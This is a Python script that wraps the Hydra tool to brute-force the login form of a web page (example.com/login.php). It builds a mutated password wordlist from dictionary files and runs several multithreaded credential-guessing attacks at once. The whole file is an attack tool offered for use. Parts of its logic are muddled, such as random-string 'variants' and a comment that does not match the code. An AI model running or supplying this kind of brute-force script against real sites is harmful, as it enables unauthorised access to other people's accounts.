#!/usr/bin/python
import os
import threading
import itertools
import string
import subprocess
import random
"""Edit in the path of your wordlists/Dictionaries and the Username/Password area with the correct option according to Hydra's Docs"""
class HydraThread(threading.Thread):
    def __init__(self, username, password):
        threading.Thread.__init__(self)
        self.username = username
        self.password = password
        
    def run(self):
        cmd = f'hydra -L {self.username} -P {self.password} example.com http-get-form "/login.php:user=^USER^&password=^PASS^:Incorrect"'
        subprocess.call(cmd, shell=True)
    
def main():
    usernames =  ['username_wordlist1.txt', 'username_wordlist2.txt', 'username_dict.txt']
    passwords = ['password_dict1', 'password_dict2.txt', 'password_dict3.txt']
    password_variations = []
    
    
    #Generate passwords from failed attempts and write to file of new wordlist
    for password_file in passwords:
        with open(password_file, 'r') as f:
            password_list = f.readlines()
            
            
        for password in password_list:
            password_variations.append(password.strip())
            password_variations.append(password.strip().upper())
            password_variations.append(password.strip().title())
            password_variations.append(password.strip()[::-1])
            password_variations.append(''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(len(password))))
    #add password variations to a password list
    password_list=list(set(password_variations))
    
    #create password list file
    with open('password_list.txt', 'w') as f:
        f.write('\n'.join(password_list))
        
    threads = []
    for username_file in usernames:
        thread = HydraThread(username_file, 'password_list.txt')
        threads.append(thread)
        thread.start()
        
    for thread in threads:
        thread.join()
        
        
if __name__ == '__main__':
    main()       
